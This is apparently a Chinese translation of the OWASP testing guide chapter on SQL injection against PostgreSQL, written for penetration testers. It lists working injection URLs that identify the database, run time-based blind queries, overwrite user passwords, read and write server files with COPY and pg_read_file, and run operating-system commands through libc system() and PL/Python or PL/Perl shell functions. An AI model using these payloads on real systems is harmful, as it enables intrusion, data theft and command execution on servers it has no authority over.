# PostgreSQL数据库测试

## 概述

本节将讨论针对 PostgreSQL 的几种 SQL 注入技术。这些技术具有以下特征：

- PHP 连接器允许通过使用 `;` 作为语句分隔符来执行多条语句
- 通过追加注释符 `--` 可截断 SQL 语句
- 在 `SELECT` 语句中可使用 `LIMIT` 和 `OFFSET` 来获取查询生成的部分结果集

下文将默认 `https://www.example.com/news.php?id=1` 存在 SQL 注入漏洞。

## 测试方法

### PostgreSQL 识别

发现 SQL 注入漏洞后，需精准确认后端数据库类型。

#### `::` 类型转换运算符

PostgreSQL 独特的 `expression::target_type` 相当于 `CAST(expression AS target_type)`，示例：

`https://www.example.com/store.php?id=1 AND 1::int=1`

##### `version()` 函数

`version()` 函数获取 PostgreSQL 标识信息。该操作同时会显示底层操作系统类型及版本，示例：

`https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`

可能返回的标识信息示例如下：

`PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)`

### 盲注

对于 SQL 盲注攻击，应考虑以下内置函数：

- 字符串长度
    `LENGTH(str)`

- 从给定字符串中提取子字符串
    `SUBSTR(str,index,offset)`

- 无单引号的字符串表示形式
    `CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)`

自 8.2 版本起，PostgreSQL 引入了内置函数 `pg_sleep(n)`，可使当前会话进程休眠 `n` 秒。该函数可用于实施时间盲注攻击（详细说明参见[盲注](https://owasp.org/www-community/attacks/Blind_SQL_Injection)）。

此外，在早期版本中可通过 libc 轻松创建自定义休眠函数：

- 
    ```sql
    -- 创造一个函数，调用 libc 库中的 sleep 函数

    CREATE function pg_sleep(int) RETURNS int 
    AS '/lib/libc.so.6', 'sleep' 
    LANGUAGE 'C' STRICT
    ```

### 单引号转义绕过

通过使用 `chr()` 函数对字符串进行编码，可绕过单引号被转义：

- `chr(n)`：返回对应 ASCII 值为数字 `n` 的字符
- `ascii(n)`：返回对应字符 `n` 的 ASCII 值

以字符串 'root' 为例：

```sql
select ascii('r')
114
select ascii('o')
111
select ascii('t')
116
```

将其编码为：

`chr(114)||chr(111)||chr(111)||chr(116)`

示例：

`https://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--`

### 攻击向量

#### 当前用户  

可通过以下 SQL SELECT 语句检索当前用户身份：

```sql
SELECT user
SELECT current_user
SELECT session_user
SELECT usename FROM pg_user
SELECT getpgusername()
```

示例：

```text
https://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--
https://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--
```

#### 当前数据库

内置函数 `current_database()` 可返回当前数据库名称。

示例：

`https://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--`

#### 文件读取

PostgreSQL 提供两种本地文件访问方式：
- `COPY` 语句
- `pg_read_file()` 内部函数（PostgreSQL 8.1 版本起支持）

##### `COPY`

该操作符在文件与表之间复制数据。PostgreSQL 引擎以 `postgres` 用户身份访问本地文件系统。

示例：

```text
/store.php?id=1; CREATE TABLE file_store(id serial, data text)--
/store.php?id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--
```

需通过 UNION 查询 SQL 注入获取数据：

- 获取先前通过 COPY 语句添加到 file_store 表中的行数
- 通过 UNION SQL 注入逐行检索数据

```text
/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
...
...
/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--
```

##### `pg_read_file()`

该函数于 PostgreSQL 8.1 版本引入，允许读取位于数据库管理系统数据目录内的任意文件。

示例：

`SELECT pg_read_file('server.key',0,1000);`

#### 文件写入

通过反转 `COPY` 语句，我们可以以 `postgres` 用户权限写入本地文件系统：

`/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`

#### Shell 注入

PostgreSQL 提供了通过动态库和脚本语言（如 python、perl 和 tcl）添加自定义函数的机制。

##### 动态库

在 PostgreSQL 8.1 之前，可以添加与 `libc` 链接的自定义函数：

`CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`

由于 `system` 返回一个 `int` 类型的执行状态码，尝试从 `system` 的标准输出中获取结果的方法为：
重定向执行结果到临时文件，再读取临时文件到自定义表中，最后输出自定义表的内容。

- 创建 `stdout` 表：`CREATE TABLE stdout(id serial, system_out text)`
- 执行shell命令并将其标准输出重定向到文件：`SELECT system('uname -a > /tmp/test')`
- 使用 `copy` 语句将上一个命令的输出内容导入到 `stdout` 表中：`COPY stdout(system_out) FROM '/tmp/test*'`
- 从 `stdout` 表中检索输出结果：`SELECT system_out FROM stdout`

示例：

```sql
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```

##### PL/Python

PL/Python 允许用户使用 Python 编写 PostgreSQL 函数。由于其属于**非受信任语言**，因此无法限制用户的操作。该功能默认未安装，可通过 `CREATELANG` 在指定数据库中启用：

- 检查数据库是否已启用 PL/Python：  
  `SELECT count(*) FROM pg_language WHERE lanname='plpythonu'`
- 若未启用，尝试启用：  
  `CREATE LANGUAGE plpythonu`
- 若上述任一操作成功，创建**代理Shell函数**：  
  ```sql
  CREATE FUNCTION proxyshell(text) RETURNS text 
  AS 'import os; return os.popen(args).read() '
  LANGUAGE plpythonu
  ```
- 执行命令：  
  `SELECT proxyshell(操作系统命令);`

示例：

- 创建代理Shell函数：  
  `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import os;return os.popen(args).read()’ LANGUAGE plpythonu;--`
- 执行操作系统命令（使用 `offset 1` 忽略原始查询）：  
  `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

##### PL/Perl

PL/Perl 允许用户使用 Perl 编写 PostgreSQL 函数。通常它以受信任语言（trusted）模式安装，此时会禁用与底层操作系统交互的运行时操作（如 `open`），因此无法获得操作系统级访问权限。为成功注入代理Shell函数，需通过 `postgres` 用户安装**非受信任版本**（untrusted），以绕过所谓的应用层对受信任/非受信任操作的过滤机制。

- 检查 PL/Perl 非受信任版本是否已启用：  
  `SELECT count(*) FROM pg_language WHERE lanname='plperlu'`
- 若未启用，且系统管理员已安装 plperl 包，则尝试：  
  `CREATE LANGUAGE plperlu`
- 若上述任一操作成功，创建代理Shell函数：  
  ```sql
  -- $_ 当前输入的默认变量
  -- | 作为系统命令执行
  -- FD 自定义输出句柄
  -- <FD> 读取句柄内容
  CREATE FUNCTION proxyshell(text) RETURNS text 
  AS 'open(FD,"$_ |");return join("",<FD>);' 
  LANGUAGE plperlu
  ```
- 执行命令：  
  `SELECT proxyshell(操作系统命令);`

示例：
- 创建代理Shell函数：  
  `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_ |");return join("",<FD>);' LANGUAGE plperlu;`
- 执行操作系统命令：  
  `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`

## References

- [WSTG-INPV-05-04](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md)
- [Testing for SQL Injection](05-Testing_for_SQL_Injection.md)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PostgreSQL Official Documentation](https://www.postgresql.org/docs/)
- [Bernardo Damele and Daniele Bellucci: sqlmap, a blind SQL injection tool](https://sqlmap.org/)